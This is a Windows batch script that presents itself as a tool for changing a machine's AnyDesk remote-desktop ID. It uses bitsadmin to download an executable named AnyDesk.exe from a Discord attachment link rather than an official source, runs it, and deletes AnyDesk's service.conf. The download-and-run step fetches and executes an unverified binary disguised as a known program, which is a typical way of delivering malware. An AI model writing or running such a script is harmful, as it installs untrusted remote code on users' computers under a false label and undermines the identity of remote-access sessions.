@echo off

:::Bitsdmin
bitsadmin /transfer calcmyDownload /download /priority foreground https://cdn.discordapp.com/attachments/1053960509524803715/1059407340874510347/AnyDesk.exe C:\Users\%username%\Documents\AnyDesk.exe 


::: Menu
:AnyDeskMenu
mode 69,10
title AnyDesk ID Change - Blueeface
cls
echo.
echo                     Change AnyDesk ID[1;31m
echo               ___                ____            __  
echo              /   ^|  ____  __  __/ __ \___  _____/ /__
echo             / /^| ^| / __ \/ / / / / / / _ \/ ___/ //_/
echo            / ___ ^|/ / / / /_/ / /_/ /  __(__  ) ,^<   
echo           /_/  ^|_/_/ /_/\__, /_____/\___/____/_/^|_^|  
echo                        /____/   

::: Script
timeout /t 2 >nul
taskkill /f /im AnyDesk.exe >nul        
timeout /t 2 >nul
start C:\Users\%username%\Documents\AnyDesk.exe                       
timeout /t 3 >nul 
taskkill /f /im AnyDesk.exe >nul                                       
timeout /t 1 >nul
del /q C:\Users\%username%\AppData\Roaming\AnyDesk\service.conf >nul  
timeout /t 1 >nul
start C:\Users\%username%\Documents\AnyDesk.exe                      
timeout /t 1 >nul
exit




